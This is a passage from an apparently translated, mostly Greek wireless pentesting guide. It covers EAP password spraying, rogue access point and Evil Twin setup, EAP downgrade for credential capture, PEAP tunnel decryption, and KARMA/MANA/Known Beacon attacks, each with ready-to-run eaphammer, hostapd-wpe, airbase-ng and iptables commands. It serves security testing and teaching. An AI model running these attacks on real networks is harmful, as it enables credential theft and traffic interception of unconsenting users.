- Ιδιωτικότητα: μόνιμη παρακολούθηση χρήστη/συσκευής από παθητικές καταγραφές Wi‑Fi σε δημόσιους χώρους.
- Εκκίνηση καταχρήσεων τηλεπικοινωνιών: με το IMSI, ένας επιτιθέμενος με πρόσβαση σε SS7/Diameter μπορεί να ερωτήσει για την τοποθεσία ή να επιχειρήσει υποκλοπή κλήσεων/SMS και κλοπή MFA.

Μειώσεις / τι να αναζητήσετε
- Επαληθεύστε ότι οι clients χρησιμοποιούν anonymous outer identities (pseudonyms) για EAP‑SIM/AKA σύμφωνα με τις οδηγίες 3GPP (π.χ., 3GPP TS 33.402).
- Προτιμήστε το tunneling του identity phase (π.χ., EAP‑TTLS/PEAP που μεταφέρει inner EAP‑SIM/AKA) ώστε το IMSI να μην αποστέλλεται ποτέ σε καθαρό κείμενο.
- Οι καταγραφές πακέτων της association/auth δεν πρέπει ποτέ να αποκαλύπτουν ένα raw IMSI στο EAP-Response/Identity.

Σχετικά: Εκμετάλλευση σηματοδοσίας τηλεπικοινωνιών με καταγεγραμμένα αναγνωριστικά κινητών
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Μπορείτε επίσης να εκτελέσετε αυτή την attack χρησιμοποιώντας `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Θεωρία επιθέσεων πελατών

### Επιλογή δικτύου και Roaming

- Το πρωτόκολλο 802.11 ορίζει πώς ένας σταθμός εντάσσεται σε ένα Extended Service Set (ESS) αλλά δεν καθορίζει τα κριτήρια για την επιλογή ενός ESS ή ενός access point (AP) εντός αυτού.
- Οι σταθμοί μπορούν να μετακινηθούν μεταξύ AP που μοιράζονται το ίδιο ESSID, διατηρώντας τη συνδεσιμότητα σε όλο το κτίριο ή την περιοχή.
- Το πρωτόκολλο απαιτεί τον έλεγχο ταυτότητας του σταθμού προς το ESS αλλά δεν επιβάλλει έλεγχο ταυτότητας του AP προς τον σταθμό.

### Λίστες Προτιμώμενων Δικτύων (PNLs)

- Οι σταθμοί αποθηκεύουν το ESSID κάθε ασύρματου δικτύου στο οποίο συνδέονται στη Λίστα Προτιμώμενων Δικτύων (PNL), μαζί με λεπτομέρειες ρυθμίσεων ειδικές για το δίκτυο.
- Η PNL χρησιμοποιείται για αυτόματη σύνδεση σε γνωστά δίκτυα, βελτιώνοντας την εμπειρία του χρήστη με την απλοποίηση της διαδικασίας σύνδεσης.

### Παθητική Σάρωση

- Τα AP εκπέμπουν περιοδικά beacon frames, ανακοινώνοντας την παρουσία και τα χαρακτηριστικά τους, συμπεριλαμβανομένου του ESSID του AP εκτός αν η εκπομπή είναι απενεργοποιημένη.
- Κατά την παθητική σάρωση, οι σταθμοί ακούν για beacon frames. Εάν το ESSID ενός beacon ταιριάζει με μία εγγραφή στην PNL του σταθμού, ο σταθμός μπορεί να συνδεθεί αυτόματα σε εκείνο το AP.
- Η γνώση της PNL μιας συσκευής επιτρέπει πιθανή εκμετάλλευση μιμούμενη το ESSID ενός γνωστού δικτύου, εξαπατώντας τη συσκευή να συνδεθεί σε rogue AP.

### Ενεργή Ανίχνευση

- Η ενεργή ανίχνευση περιλαμβάνει σταθμούς που στέλνουν probe requests για να εντοπίσουν κοντινά AP και τα χαρακτηριστικά τους.
- Τα directed probe requests στοχεύουν σε συγκεκριμένο ESSID, βοηθώντας στον εντοπισμό αν ένα συγκεκριμένο δίκτυο βρίσκεται εντός εύρους, ακόμα κι αν είναι hidden network.
- Τα broadcast probe requests έχουν πεδίο SSID null και αποστέλλονται σε όλα τα κοντινά AP, επιτρέποντας στον σταθμό να ελέγξει για οποιοδήποτε προτιμώμενο δίκτυο χωρίς να αποκαλύπτει το περιεχόμενο της PNL του.

## Simple AP with redirection to Internet

Πριν εξηγήσουμε πώς να πραγματοποιήσουμε πιο σύνθετες επιθέσεις, θα εξηγηθεί **πώς** απλώς να **δημιουργήσετε** ένα **AP** και να **ανακατευθύνετε** την **κίνηση** του σε μια διεπαφή συνδεδεμένη στο **Internet**.

Using `ifconfig -a` ελέγξτε ότι η wlan διεπαφή για τη δημιουργία του AP και η διεπαφή συνδεδεμένη στο Internet είναι παρούσες.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Δημιουργήστε το config αρχείο `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Στη συνέχεια **ρυθμίστε τις IPs** και **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Και μετά **ξεκινήστε** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Δημιουργήστε ένα αρχείο config `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Τερμάτισε ενοχλητικές διεργασίες**, όρισε **monitor mode**, και **εκκίνησε hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Προώθηση και Ανακατεύθυνση
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack εκμεταλλεύεται τον τρόπο που οι WiFi clients αναγνωρίζουν τα δίκτυα, βασιζόμενο κυρίως στο όνομα δικτύου (ESSID), χωρίς να απαιτεί από το base station (access point) να αυθεντικοποιηθεί προς τον client. Κύρια σημεία:

- **Δυσκολία στη Διάκριση**: Οι συσκευές δυσκολεύονται να διακρίνουν μεταξύ νόμιμων και κακόβουλων access points όταν μοιράζονται το ίδιο ESSID και τύπο κρυπτογράφησης. Τα πραγματικά δίκτυα συχνά χρησιμοποιούν πολλαπλά access points με το ίδιο ESSID για να επεκτείνουν την κάλυψη απρόσκοπτα.
- **Client Roaming και Χειραγώγηση Σύνδεσης**: Το πρωτόκολλο 802.11 επιτρέπει στις συσκευές να περιηγούνται μεταξύ access points εντός του ίδιου ESS. Οι επιτιθέμενοι μπορούν να το εκμεταλλευτούν δελεάζοντας μια συσκευή να αποσυνδεθεί από το τρέχον base station και να συνδεθεί σε ένα κακόβουλο access point. Αυτό μπορεί να επιτευχθεί προσφέροντας ένα ισχυρότερο σήμα ή διακόπτοντας τη σύνδεση με το νόμιμο access point μέσω μεθόδων όπως deauthentication packets ή jamming.
- **Προκλήσεις στην Εκτέλεση**: Η επιτυχημένη εκτέλεση ενός evil twin attack σε περιβάλλοντα με πολλαπλά, καλά τοποθετημένα access points μπορεί να είναι δύσκολη. Η αποσύνδεση (deauthenticating) ενός μόνο νόμιμου access point συχνά οδηγεί στη σύνδεση της συσκευής με κάποιο άλλο νόμιμο access point, εκτός αν ο επιτιθέμενος μπορεί να αποσυνδέσει (deauthenticate) όλα τα κοντινά access points ή να τοποθετήσει στρατηγικά το rogue access point.

Μπορείτε να δημιουργήσετε ένα πολύ βασικό Open Evil Twin (χωρίς δυνατότητες προώθησης κίνησης στο Internet) κάνοντας:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Μπορείτε επίσης να δημιουργήσετε ένα Evil Twin χρησιμοποιώντας **eaphammer** (σημειώστε ότι για να δημιουργήσετε evil twins με το eaphammer η διεπαφή **should NOT be** σε **monitor** λειτουργία):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ή χρησιμοποιώντας Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Παρακαλώ σημειώστε ότι από προεπιλογή, αν ένα ESSID στο PNL είναι αποθηκευμένο ως WPA protected, η συσκευή δεν θα συνδεθεί αυτόματα σε ένα Open evil Twin. Μπορείτε να προσπαθήσετε να DoS το πραγματικό AP και να ελπίζετε ότι ο χρήστης θα συνδεθεί χειροκίνητα στο Open evil twin σας, ή μπορείτε να DoS το πραγματικό AP και να χρησιμοποιήσετε ένα WPA Evil Twin για να καταγράψετε το handshake (χρησιμοποιώντας αυτή τη μέθοδο δεν θα μπορείτε να επιτρέψετε στο θύμα να συνδεθεί σε εσάς καθώς δεν γνωρίζετε το PSK, αλλά μπορείτε να καταγράψετε το handshake και να προσπαθήσετε να το crack).

_Κάποια OS και AV θα προειδοποιήσουν τον χρήστη ότι η σύνδεση σε ένα Open network είναι επικίνδυνη..._

### WPA/WPA2 Evil Twin

Μπορείτε να δημιουργήσετε ένα **Evil Twin using WPA/2** και αν οι συσκευές έχουν ρυθμιστεί να συνδέονται σε αυτό το SSID με WPA/2, θα προσπαθήσουν να συνδεθούν. Ωστόσο, **to complete the 4-way-handshake** χρειάζεται επίσης να **γνωρίζετε** τον **κωδικό** που ο client θα χρησιμοποιήσει. Αν **δεν τον γνωρίζετε**, η **σύνδεση δεν θα ολοκληρωθεί**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Για να κατανοήσετε αυτές τις επιθέσεις, συνιστώ να διαβάσετε πρώτα τη σύντομη [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Χρήση hostapd-wpe**

`hostapd-wpe` χρειάζεται ένα **αρχείο διαμόρφωσης** για να λειτουργήσει. Για να **αυτοματοποιήσετε** τη δημιουργία αυτών των αρχείων διαμόρφωσης, μπορείτε να χρησιμοποιήσετε [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (κατεβάστε το python αρχείο μέσα στο _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Στο αρχείο διαμόρφωσης μπορείτε να επιλέξετε πολλά διαφορετικά πράγματα όπως ssid, channel, user files, cret/key, dh parameters, wpa version και auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Χρήση EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Από προεπιλογή, το EAPHammer χρησιμοποιεί αυτές τις authentication μεθόδους (σημειώστε το GTC ως την πρώτη που προσπαθεί να αποκτήσει plaintext passwords και μετά τη χρήση πιο αξιόπιστων auth μεθόδων):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Αυτή είναι η προεπιλεγμένη μεθοδολογία για να αποφύγετε μεγάλους χρόνους σύνδεσης. Ωστόσο, μπορείτε επίσης να καθορίσετε στον server τις authentication methods από τις ασθενέστερες στις ισχυρότερες:
```
--negotiate weakest
```
Εναλλακτικά μπορείς επίσης να χρησιμοποιήσεις:

- `--negotiate gtc-downgrade` για να χρησιμοποιήσεις πολύ αποδοτική υλοποίηση GTC downgrade (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` για να καθορίσεις χειροκίνητα τις μεθόδους που προσφέρονται (προσφέροντας τις ίδιες μεθόδους πιστοποίησης με την ίδια σειρά που χρησιμοποιεί ο οργανισμός, η επίθεση θα είναι πολύ πιο δύσκολο να εντοπιστεί).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` μπορεί να χρησιμοποιήσει προηγουμένως δημιουργημένα certificated για να προσφέρει EAP authentication σε δίκτυα WPA/WPA2-Enterprise. Το ψεύτικο δίκτυο θα υποβαθμίσει το πρωτόκολλο σύνδεσης σε EAP-MD5 έτσι ώστε να μπορεί να **capture the user and the MD5 of the password**. Αργότερα, ο επιτιθέμενος μπορεί να προσπαθήσει να crack the password.\
`Airggedon` σας προσφέρει τη δυνατότητα ενός **continuous Evil Twin attack (noisy)** ή **να δημιουργήσει μόνο το Evil Attack μέχρι να συνδεθεί κάποιος (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Η μέθοδος δοκιμάστηκε σε σύνδεση PEAP αλλά, επειδή αποκρυπτογραφώ μια αυθαίρετη TLS tunnel, αυτό θα πρέπει να λειτουργεί και με EAP-TTLS_

Μέσα στη **διαμόρφωση** του _hostapd-wpe_ **σχολιάστε** τη γραμμή που περιέχει _**dh_file**_ (από `dh_file=/etc/hostapd-wpe/certs/dh` σε `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Αυτό θα κάνει το `hostapd-wpe` να **ανταλλάξει κλειδιά χρησιμοποιώντας RSA** αντί για DH, οπότε θα μπορέσετε να **αποκρυπτογραφήσετε** την κίνηση αργότερα **γνωρίζοντας το private key του server**.

Τώρα ξεκινήστε το **Evil Twin** χρησιμοποιώντας το **`hostapd-wpe`** με αυτή τη τροποποιημένη διαμόρφωση όπως συνήθως. Επίσης, ξεκινήστε το **`wireshark`** στην **interface** που πραγματοποιεί την επίθεση Evil Twin.

Τώρα ή αργότερα (όταν έχετε ήδη captured κάποια authentication intents) μπορείτε να προσθέσετε το private RSA key στο wireshark σε: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Προσθέστε μια νέα εγγραφή και συμπληρώστε τη φόρμα με αυτές τις τιμές: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**επιλέξτε το key file σας**, για να αποφύγετε προβλήματα επιλέξτε ένα key file **χωρίς password protection**).

![](<../../images/image (687).png>)

Και δείτε την νέα **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID και MAC black/whitelists

Διαφορετικοί τύποι Media Access Control Filter Lists (MFACLs) και οι αντίστοιχοι τρόποι λειτουργίας τους και οι επιπτώσεις στη συμπεριφορά ενός rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Ο rogue AP θα απαντά μόνο σε probe requests από συσκευές που αναφέρονται στη whitelist, παραμένοντας αόρατος για όλες τις υπόλοιπες που δεν είναι στη λίστα.
2. **MAC-based Blacklist**:
- Ο rogue AP θα αγνοεί probe requests από συσκευές στη blacklist, καθιστώντας τον rogue AP ουσιαστικά αόρατο για αυτές τις συγκεκριμένες συσκευές.
3. **SSID-based Whitelist**:
- Ο rogue AP θα απαντά σε probe requests μόνο για συγκεκριμένα ESSIDs που αναγράφονται, καθιστώντας τον αόρατο για συσκευές των οποίων οι Λίστες Προτιμώμενων Δικτύων (Preferred Network Lists, PNLs) δεν περιλαμβάνουν αυτά τα ESSIDs.
4. **SSID-based Blacklist**:
- Ο rogue AP δεν θα απαντά σε probe requests για τα συγκεκριμένα ESSIDs που βρίσκονται στη blacklist, καθιστώντας τον αόρατο για συσκευές που αναζητούν αυτά τα δίκτυα.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Αυτή η μέθοδος επιτρέπει σε έναν **attacker να δημιουργήσει ένα malicious access point (AP) που ανταποκρίνεται σε όλα τα probe requests** από συσκευές που προσπαθούν να συνδεθούν σε δίκτυα. Αυτή η τεχνική **ξεγελάει τις συσκευές ώστε να συνδεθούν στο AP του attacker** μιμούμενη τα δίκτυα που οι συσκευές αναζητούν. Μόλις μια συσκευή στείλει αίτημα σύνδεσης σε αυτό το rogue AP, η σύνδεση ολοκληρώνεται, με αποτέλεσμα η συσκευή να συνδεθεί λανθασμένα στο δίκτυο του attacker.

### MANA

Στη συνέχεια, **devices άρχισαν να αγνοούν μη αξιόπιστες απαντήσεις δικτύου**, μειώνοντας την αποτελεσματικότητα της αρχικής karma attack. Ωστόσο, μια νέα μέθοδος, γνωστή ως την **MANA attack**, εισήχθη από τους Ian de Villiers και Dominic White. Αυτή η μέθοδος περιλαμβάνει το rogue AP **που καταγράφει τα Preferred Network Lists (PNL) από τις συσκευές απαντώντας στα broadcast probe requests τους** με ονόματα δικτύων (SSIDs) που οι συσκευές είχαν προηγουμένως αποθηκεύσει. Αυτή η εξελιγμένη επίθεση παρακάμπτει τις προστασίες ενάντια στην αρχική karma attack εκμεταλλευόμενη τον τρόπο που οι συσκευές θυμούνται και δίνουν προτεραιότητα σε γνωστά δίκτυα.

Η MANA attack λειτουργεί παρακολουθώντας τόσο τα directed όσο και τα broadcast probe requests από τις συσκευές. Για directed requests, καταγράφει τη MAC address της συσκευής και το ζητούμενο όνομα δικτύου, προσθέτοντας αυτές τις πληροφορίες σε μια λίστα. Όταν λαμβάνεται broadcast request, το AP ανταποκρίνεται με πληροφορίες που ταιριάζουν με οποιοδήποτε από τα δίκτυα στη λίστα της συσκευής, δελεάζοντας τη συσκευή να συνδεθεί στο rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Μια **Loud MANA attack** είναι μια προχωρημένη στρατηγική για περιπτώσεις όπου οι συσκευές δεν χρησιμοποιούν directed probing ή όταν οι Preferred Network Lists (PNL) τους είναι άγνωστες στον attacker. Λειτουργεί με την αρχή ότι **οι συσκευές στην ίδια περιοχή πιθανότατα μοιράζονται κάποια ονόματα δικτύων στις PNLs τους**. Αντί να ανταποκρίνεται επιλεκτικά, αυτή η attack εκπέμπει probe responses για κάθε network name (ESSID) που βρέθηκε στις συνδυασμένες PNLs όλων των παρατηρούμενων συσκευών. Αυτή η ευρεία προσέγγιση αυξάνει την πιθανότητα μια συσκευή να αναγνωρίσει ένα γνώριμο δίκτυο και να προσπαθήσει να συνδεθεί στο rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Όταν η **Loud MANA attack** μπορεί να μην επαρκεί, η **Known Beacon attack** παρουσιάζει μια άλλη προσέγγιση. Αυτή η μέθοδος **brute-forces τη διαδικασία σύνδεσης προσομοιώνοντας έναν AP που απαντά σε οποιοδήποτε όνομα δικτύου, διατρέχοντας μια λίστα πιθανών ESSIDs** που προκύπτουν από wordlist. Αυτό προσομοιώνει την παρουσία πολλών δικτύων, με την ελπίδα να ταιριάξει ένα ESSID στη PNL του θύματος, προτρέποντας μια προσπάθεια σύνδεσης στο κατασκευασμένο AP. Η επίθεση μπορεί να ενισχυθεί συνδυάζοντάς την με την επιλογή `--loud` για μια πιο επιθετική προσπάθεια παγίδευσης συσκευών.

Eaphammer υλοποίησε αυτήν την επίθεση ως MANA attack όπου όλα τα ESSIDs μέσα σε μια λίστα εκπέμπονται (μπορείτε επίσης να το συνδυάσετε με `--loud` για να δημιουργήσετε ένα Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Η **Known Beacon Burst attack** περιλαμβάνει την έντονη εκπομπή beacon frames για κάθε ESSID που αναγράφεται σε ένα αρχείο. Αυτό δημιουργεί ένα πυκνό περιβάλλον ψεύτικων δικτύων, ενισχύοντας σημαντικά την πιθανότητα οι συσκευές να συνδεθούν στο rogue AP, ειδικά όταν συνδυάζεται με MANA attack. Αυτή η τεχνική αξιοποιεί την ταχύτητα και τον όγκο για να υπερφορτώσει τους μηχανισμούς επιλογής δικτύου των συσκευών.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** είναι ένα πρωτόκολλο που επιτρέπει στις συσκευές να συνδέονται απευθείας μεταξύ τους χρησιμοποιώντας Wi‑Fi χωρίς την ανάγκη ενός παραδοσιακού ασύρματου σημείου πρόσβασης. Αυτή η δυνατότητα είναι ενσωματωμένη σε διάφορες Internet of Things (IoT) συσκευές, όπως εκτυπωτές και τηλεοράσεις, διευκολύνοντας την απευθείας επικοινωνία συσκευή-προς-συσκευή. Ένα αξιοσημείωτο χαρακτηριστικό του Wi‑Fi Direct είναι ότι μία συσκευή αναλαμβάνει τον ρόλο ενός σημείου πρόσβασης, γνωστή ως group owner, για τη διαχείριση της σύνδεσης.

Η ασφάλεια για τις συνδέσεις Wi‑Fi Direct καθιερώνεται μέσω του **Wi‑Fi Protected Setup (WPS)**, που υποστηρίζει αρκετές μεθόδους για ασφαλές ζευγάρωμα, συμπεριλαμβανομένων:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Αυτές οι μέθοδοι, ιδιαίτερα το PIN entry, είναι ευάλωτες στις ίδιες ευπάθειες με το WPS σε παραδοσιακά δίκτυα Wi‑Fi, καθιστώντας τες στόχους για παρόμοια διανύσματα επίθεσης.

### EvilDirect Hijacking

**EvilDirect Hijacking** είναι μια επίθεση ειδική για το Wi‑Fi Direct. Αντιστοιχεί στην έννοια της επίθεσης Evil Twin αλλά στοχεύει τις συνδέσεις Wi‑Fi Direct. Σε αυτό το σενάριο, ο επιτιθέμενος προσποιείται έναν νόμιμο group owner με στόχο να ξεγελάσει συσκευές ώστε να συνδεθούν με κακόβουλη οντότητα. Αυτή η μέθοδος μπορεί να εκτελεστεί χρησιμοποιώντας εργαλεία όπως το `airbase-ng` προσδιορίζοντας κανάλι, ESSID και MAC address της προσποιούμενης συσκευής:

## Αναφορές

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Ρίξτε μια ματιά στο [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login με Facebook και μίμηση WPA σε captive portals)

{{#include ../../banners/hacktricks-training.md}}
